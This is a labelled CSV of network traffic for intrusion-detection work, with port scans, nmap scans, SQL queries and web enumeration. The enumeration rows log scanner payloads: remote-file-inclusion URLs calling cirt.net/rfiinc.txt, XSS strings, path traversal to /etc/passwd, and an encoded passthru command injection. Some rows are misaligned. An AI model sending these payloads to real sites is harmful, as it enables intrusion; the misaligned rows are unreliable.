@timestamp,src_ip,src_port,dst_ip,dst_port,Protocol,http_request_method,http_request_referrer,http_response_code,url_path,user_agent_original,sql_method,sql_query,category,label_
1666690178,192.168.34.11,53110,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/clickcount.pl,0,0,0,web_enumeration,2
1666704526, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692056,10.32.4.176,33522,10.132.100.52,1036,TCP,0,0,0,0,0,0,0,port_scan,0
1666691974,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666690179,192.168.34.11,53206,192.168.33.12,0,HTTP,0,0,0,/modif_infos.asp,0,0,0,web_enumeration,2
1666541395,0,52597,104.210.1.104,443,0,0,0,0,0,0,0,0,port_scan,3
1666692078,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666591877,10.0.0.20,34298,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT  t.term_id
			FROM wp_terms AS t  INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id
			WHERE tt.taxonomy IN ('wp_theme') AND t.name IN ('twentytwenty')
			
			LIMIT 1",sql_enumeration,0
1666542056,192.168.106.1,50072,192.168.106.130,53,2022-10-24 00:20:32 ALLOW UDP 192.168.106.1 192.168.106.130 50072 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666580401,192.168.207.142,0,0,0,HTTPS,GET,0,404,/adodb/adodb.inc.php?path=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666580405,192.168.207.142,0,0,0,HTTPS,GET,0,404,/v-webmail/includes/mailaccess/pop3.php?CONFIG[pear_dir]=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666695782, 192.168.10.2,9200,47634,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580395,192.168.207.142,0,0,0,HTTPS,POST,0,404,/servlet/CookieExample?cookiename=<script>alert(\x5C\x22Vulnerable\x5C\x22)</script>,Mozilla/5.00,0,0,web_enumeration,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/support.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666580408,192.168.207.142,0,0,0,HTTPS,GET,0,404,/serverVars.js,Mozilla/5.00,0,0,web_enumeration,1
1666591317,10.0.0.20,33828,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent_comments' LIMIT 1,sql_enumeration,0
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/hits.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666590829,0,0,10.0.0.22,5044,0,0,0,0,0,0,0,0,sql_enumeration,0
1666591260,0,0,10.0.0.20,80,0,0,0,0,0,0,0,0,sql_enumeration,0
1666691945,100.64.19.103,54440,100.64.19.22,22,TCP,0,0,0,0,0,0,0,port_scan,3
1666691972,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582468,192.168.207.142,0,0,0,HTTPS,GET,0,404,/exchange/lib/logon.inc,Mozilla/5.00,0,0,web_enumeration,1
1666691974,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692056,10.32.4.176,57266,10.132.100.52,9485,TCP,0,0,0,0,0,0,0,port_scan,0
1666590720,0,0,127.0.0.1,8080,0,0,0,0,0,0,0,0,sql_enumeration,3
1666692057,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591570,0,0,10.0.0.20,80,0,0,0,0,0,0,0,0,sql_enumeration,0
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666591930,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666691985,10.32.4.176,42356,10.132.100.53,787,TCP,0,0,0,0,0,0,0,port_scan,0
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/beta.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692118,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691929,100.64.19.103,50696,100.64.19.22,5801,TCP,0,0,0,0,0,0,0,port_scan,3
1666691985,10.32.4.176,43226,10.132.100.53,7937,TCP,0,0,0,0,0,0,0,port_scan,0
1666691996,10.132.100.53,445,10.32.4.176,41704,TCP,0,0,0,0,0,0,0,port_scan,0
1666582486,192.168.207.142,0,0,0,HTTPS,POST,0,404,/moadmin.php,Mozilla/5.00,0,0,web_enumeration,1
1666541671,127.0.0.1,60915,127.0.0.1,5601,2022-10-24 00:14:06 ALLOW TCP 127.0.0.1 127.0.0.1 60915 5601 0 - 0 0 0 - - - RECEIVE 2728,TCP,0,0,0,0,0,0,port_scan,3
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691974,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591269,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/formhandler.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666580396,192.168.207.142,0,0,0,HTTPS,GET,0,404,/WS_FTP.LOG,Mozilla/5.00,0,0,web_enumeration,1
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/stats/,0,0,0,web_enumeration,2
1666542079,0,54093,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666580405,192.168.207.142,0,0,0,HTTPS,GET,0,404,/wp-content/plugins/wordtube/wordtube-button.php?wpPATH=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666347710,192.168.0.3,58224,192.168.0.2,9200,tcp,0,0,0,0,0,0,0,port_scan,2
1666582468,192.168.207.142,0,0,0,HTTPS,GET,0,404,/SiteServer/Admin/knowledge/dsmgr/users/GroupManager.asp,Mozilla/5.00,0,0,web_enumeration,1
1666692058,10.32.4.176,45160,10.132.100.52,1034,TCP,0,0,0,0,0,0,0,port_scan,0
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/elements.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691974,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691932,100.64.19.103,46798,100.64.19.22,2004,TCP,0,0,0,0,0,0,0,port_scan,3
1666691984,10.32.4.176,52576,10.132.100.53,1972,TCP,0,0,0,0,0,0,0,port_scan,0
1666580393,192.168.207.142,0,0,0,HTTPS,GET,0,404,/192.168.tar.gz,Mozilla/5.00,0,0,web_enumeration,1
1666580407,192.168.207.142,0,0,0,HTTPS,GET,0,404,/debug.asp,Mozilla/5.00,0,0,web_enumeration,1
1666691983,10.32.4.176,37988,10.132.100.53,1044,TCP,0,0,0,0,0,0,0,port_scan,0
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692123,10.132.101.52,42736,10.132.101.101,443,TCP,0,0,0,0,0,0,0,port_scan,0
1666631215,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666580400,192.168.207.142,0,0,0,HTTPS,GET,0,404,/cl/,Mozilla/5.00,0,0,web_enumeration,1
1666580397,192.168.207.142,0,0,0,HTTPS,GET,0,404,/mail/settings.html,Mozilla/5.00,0,0,web_enumeration,1
1666691931,100.64.19.103,54926,100.64.19.22,7200,TCP,0,0,0,0,0,0,0,port_scan,3
1664429660,192.168.91.1,57621,192.168.91.255,57621,0,0,0,0,0,0,0,0,port_scan,2
1666692058,10.32.4.176,57996,10.132.100.52,543,TCP,0,0,0,0,0,0,0,port_scan,0
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/stats_old/,0,0,0,web_enumeration,2
1666692145,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666691983,10.32.4.176,50900,10.132.100.53,389,TCP,0,0,0,0,0,0,0,port_scan,0
1666591577,10.0.0.20,34046,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT @@SESSION.sql_mode,sql_enumeration,0
1666692043,10.132.100.53,445,10.32.4.176,41682,TCP,0,0,0,0,0,0,0,port_scan,0
1666692058,10.32.4.176,40000,10.132.100.52,900,TCP,0,0,0,0,0,0,0,port_scan,0
1666692057,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691984,10.32.4.176,50788,10.132.100.53,1002,TCP,0,0,0,0,0,0,0,port_scan,0
1666692057,10.32.4.176,47762,10.132.100.52,1084,TCP,0,0,0,0,0,0,0,port_scan,0
1666691975,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591750,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666582466,192.168.207.142,0,0,0,HTTPS,GET,0,200,/,Mozilla/5.00,0,0,web_enumeration,1
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/lost%2Bfound,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666580397,192.168.207.142,0,0,0,HTTPS,GET,0,404,/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/.../.../.../.../.../.../boot.ini,Mozilla/5.00,0,0,web_enumeration,1
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/power.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666582475,192.168.207.142,0,0,0,HTTPS,GET,0,404,/phpinfo.php?GLOBALS[test]=<script>alert(document.cookie);</script>,Mozilla/5.00,0,0,web_enumeration,1
1666692076,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666582482,192.168.207.142,0,0,0,HTTPS,GET,0,404,/smarty.php?xcart_dir=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666582480,192.168.207.142,0,0,0,HTTPS,GET,0,200,/index.php?ilang=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666591820,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666591067,10.0.0.20,33610,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT   wp_posts.ID
					FROM wp_posts 
					WHERE 1=1  AND ( 
  0 = 1
) AND wp_posts.post_type = 'wp_global_styles' AND ((wp_posts.post_status = 'publish'))
					GROUP BY wp_posts.ID
					ORDER BY wp_posts.post_date DESC
					LIMIT 0, 1",sql_enumeration,0
1666692123,10.132.101.101,3306,10.132.101.52,38270,TCP,0,0,0,0,0,0,0,port_scan,0
1666582465,192.168.207.142,0,0,0,HTTPS,GET,0,404,/LvAjqjtV.jws,Mozilla/5.00,0,0,web_enumeration,1
1666542563,192.168.1.225,53757,192.168.1.254,53,2022-10-24 00:29:00 ALLOW UDP 192.168.1.225 192.168.1.254 53757 53 0 - - - - - - - SEND 2384,UDP,0,0,0,0,0,0,port_scan,2
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692145,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591587,10.0.0.20,34054,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT wp_posts.* FROM wp_posts WHERE ID IN (1),sql_enumeration,0
1666690178,192.168.34.11,53110,192.168.33.12,0,HTTP,0,0,0,/www0sql/,0,0,0,web_enumeration,2
1666582478,192.168.207.142,0,0,0,HTTPS,GET,0,404,/change_preferences2.php?target=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666630357,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666591909,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666591150,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666691929,100.64.19.103,49784,100.64.19.22,1028,TCP,0,0,0,0,0,0,0,port_scan,3
1666582485,192.168.207.142,0,0,0,HTTPS,GET,0,404,/useradmin/index.jsp,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666542079,0,53895,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666690179,192.168.34.11,53138,192.168.33.12,0,HTTP,0,0,0,/forum1.asp,0,0,0,web_enumeration,2
1666582486,192.168.207.142,0,0,0,HTTPS,GET,0,404,/rails/info/routes/,Mozilla/5.00,0,0,web_enumeration,1
1666692055,10.32.4.176,34166,10.132.100.52,5000,TCP,0,0,0,0,0,0,0,port_scan,0
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580401,192.168.207.142,0,0,0,HTTPS,GET,0,404,/admin/testing/tests/0004_init_urls.php?init_path=http://cirt.net/rfiinc.txt??&,Mozilla/5.00,0,0,web_enumeration,1
1666691974,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666590959,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666542124,0,57903,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666422220,192.168.0.3,54468,192.168.0.2,9200,tcp,0,0,0,0,0,0,0,port_scan,2
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692057,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580405,192.168.207.142,0,0,0,HTTPS,GET,0,404,/modelsearch/login.asp,Mozilla/5.00,0,0,web_enumeration,1
1666542071,0,50936,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666580408,192.168.207.142,0,0,0,HTTPS,GET,0,404,/shop/magmi/web/download_file.php?file=../../app/etc/local.xml,Mozilla/5.00,0,0,web_enumeration,1
1666582472,192.168.207.142,0,0,0,HTTPS,GET,0,404,/intranet/,Mozilla/5.00,0,0,web_enumeration,1
1666691985,10.32.4.176,39142,10.132.100.53,2047,TCP,0,0,0,0,0,0,0,port_scan,0
1666691985,10.32.4.176,42842,10.132.100.53,5054,TCP,0,0,0,0,0,0,0,port_scan,0
1666591110,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666582476,192.168.207.142,0,0,0,HTTPS,GET,0,404,/bh/,Mozilla/5.00,0,0,web_enumeration,1
1666692057,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591747,10.0.0.20,34190,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT   wp_posts.ID
					FROM wp_posts 
					WHERE 1=1  AND ( 
  0 = 1
) AND wp_posts.post_type = 'wp_global_styles' AND ((wp_posts.post_status = 'publish'))
					GROUP BY wp_posts.ID
					ORDER BY wp_posts.post_date DESC
					LIMIT 0, 1",sql_enumeration,0
1664428830,192.168.91.128,39678,192.168.91.1,121,udp,0,0,0,0,0,0,0,port_scan,2
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/CYBERDOCS31,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591297,10.0.0.20,33810,10.0.0.21,3306,mysql,0,0,0,0,0,SET,"SET SESSION sql_mode='ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'",sql_enumeration,0
1666591767,10.0.0.20,34206,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT  t.term_id
			FROM wp_terms AS t  INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id
			WHERE tt.taxonomy IN ('wp_theme') AND t.name IN ('twentytwenty')
			
			LIMIT 1",sql_enumeration,0
1666541775,192.168.1.225,59838,74.125.200.106,443,2022-10-24 00:15:40 ALLOW UDP 192.168.1.225 74.125.200.106 59838 443 0 - - - - - - - SEND 18232,UDP,0,0,0,0,0,0,port_scan,1
1666580408,192.168.207.142,0,0,0,HTTPS,GET,0,404,/magento/magmi/web/download_file.php?file=../../app/etc/local.xml,Mozilla/5.00,0,0,web_enumeration,1
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666590919,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666582481,192.168.207.142,0,0,0,HTTPS,GET,0,404,/noah/modules/noevents/templates/mfa_theme.php?tpls[1]=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666692075,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666690179,192.168.34.11,53232,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666591677,10.0.0.20,34130,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'theme_switched' LIMIT 1,sql_enumeration,0
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666692064,10.32.4.176,52260,10.132.100.52,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/download,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692056,10.32.4.176,49672,10.132.100.52,19,TCP,0,0,0,0,0,0,0,port_scan,0
1666692056,10.32.4.176,52220,10.132.100.52,1417,TCP,0,0,0,0,0,0,0,port_scan,0
1666580403,192.168.207.142,0,0,0,HTTPS,GET,0,200,/index.php?do=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666692078,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666347760,192.168.0.3,58224,192.168.0.2,9200,tcp,0,0,0,0,0,0,0,port_scan,2
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691985,10.32.4.176,43638,10.132.100.53,5102,TCP,0,0,0,0,0,0,0,port_scan,0
1666590997,10.0.0.22,56606,10.0.0.20,80,http,0,0,0,0,0,GET,GET /,sql_enumeration,0
1666690179,192.168.34.11,53232,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/awl/auctionweaver.pl,0,0,0,web_enumeration,2
1666692055,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691985,10.32.4.176,37748,10.132.100.53,2106,TCP,0,0,0,0,0,0,0,port_scan,0
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666582479,192.168.207.142,0,0,0,HTTPS,GET,0,404,/files/compose-send.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/script,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666590997,10.0.0.20,33550,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id WHERE t.term_id IN (1)",sql_enumeration,0
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692065,10.32.4.176,46512,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666692077,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666582483,192.168.207.142,0,0,0,HTTPS,GET,0,404,/web/Administration/Includes/contentHome.php?path_prefix=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666722168, 172.24.2.11 ,0,172.24.2.100,0,HTTP,GET,0,404,/audit,gobuster/3.2.0-dev,0,0,web_enumeration,3
1666582481,192.168.207.142,0,0,0,HTTPS,GET,0,404,/module/forum/forum.php?fd=http://cirt.net/rfiinc.txt?=';,Mozilla/5.00,0,0,web_enumeration,1
1664428820,192.168.91.128,50310,192.168.91.1,153,tcp,0,0,0,0,0,0,0,port_scan,2
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666542548,192.168.1.254,33947,239.255.255.250,1900,2022-10-24 00:28:42 DROP UDP 192.168.1.254 239.255.255.250 33947 1900 523 - - - - - - - RECEIVE 11164,UDP,0,0,0,0,0,0,port_scan,2
1666580394,192.168.207.142,0,0,0,HTTPS,GET,0,404,/jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../etc/passwd,Mozilla/5.00,0,0,web_enumeration,1
1666690179,192.168.34.11,53116,192.168.33.12,0,HTTP,0,0,0,/forum0ra_professionnel.asp,0,0,0,web_enumeration,2
1666590800,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666512267,192.168.0.3,0,0,0,0,0,0,0,0,0,0,0,smtp_enumeration,1
1666690179,192.168.34.11,53232,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666542072,0,53441,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666542072,192.168.106.1,53274,192.168.106.130,53,2022-10-24 00:20:40 ALLOW UDP 192.168.106.1 192.168.106.130 53274 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666692055,10.32.4.176,53402,10.132.100.52,2288,TCP,0,0,0,0,0,0,0,port_scan,0
1666591380,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692057,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666691985,10.32.4.176,59982,10.132.100.53,3371,TCP,0,0,0,0,0,0,0,port_scan,0
1666691993,10.132.100.53,22,10.32.4.176,57592,TCP,0,0,0,0,0,0,0,port_scan,0
1666582476,192.168.207.142,0,0,0,HTTPS,GET,0,404,/js/editor/fckeditor/editor/dialog/fck_link.html,Mozilla/5.00,0,0,web_enumeration,1
1666590890,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666582471,192.168.207.142,0,0,0,HTTPS,GET,0,200,/index.php?name=Forums&file=viewtopic&t=2&rush=%6c%73%20%2d%61%6c&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5f%47%45%54%5f%56%41%52%53%5b%72%75%73%68%5d%29.%2527,Mozilla/5.00,0,0,web_enumeration,1
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692064,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666541358,0,53401,204.79.197.222,443,0,0,0,0,0,0,0,0,port_scan,3
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666692055,10.32.4.176,51184,10.132.100.52,3333,TCP,0,0,0,0,0,0,0,port_scan,0
1666591250,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692043,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666591300,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666582469,192.168.207.142,0,0,0,HTTPS,GET,0,400,/%a%s%p%d,-,0,0,web_enumeration,1
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580393,192.168.207.142,0,0,0,HTTPS,GET,0,404,/site.pem,Mozilla/5.00,0,0,web_enumeration,1
1666591757,10.0.0.20,34198,10.0.0.21,3306,mysql,0,0,0,0,0,SET,SET NAMES utf8mb4,sql_enumeration,0
1666690178,192.168.34.11,53110,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/excite,0,0,0,web_enumeration,2
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/gpapp.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666631186,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666580405,192.168.207.142,0,0,0,HTTPS,GET,0,404,/yonetim.php,Mozilla/5.00,0,0,web_enumeration,1
1666542072,0,53674,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666590727,10.0.0.20,33320,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'large_crop' LIMIT 1,sql_enumeration,0
1666590677,10.0.0.20,33278,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent_comments' LIMIT 1,sql_enumeration,0
1666691985,10.32.4.176,33384,10.132.100.53,987,TCP,0,0,0,0,0,0,0,port_scan,0
1666591577,10.0.0.20,34046,10.0.0.21,3306,mysql,0,0,0,0,0,SET,"SET SESSION sql_mode='ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION'",sql_enumeration,0
1666542072,0,53524,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666691970,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666542079,0,53919,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666591437,10.0.0.20,33930,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent-comments' LIMIT 1,sql_enumeration,0
1666580408,192.168.207.142,0,0,0,HTTPS,GET,0,404,/azenv.php,Mozilla/5.00,0,0,web_enumeration,1
1666631416,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666691983,10.32.4.176,58604,10.132.100.53,2608,TCP,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/servers,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691955,100.64.19.22,8443,100.64.19.103,43540,TCP,0,0,0,0,0,0,0,port_scan,3
1666691974,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666591137,10.0.0.20,33670,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent_comments' LIMIT 1,sql_enumeration,0
1666692076,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
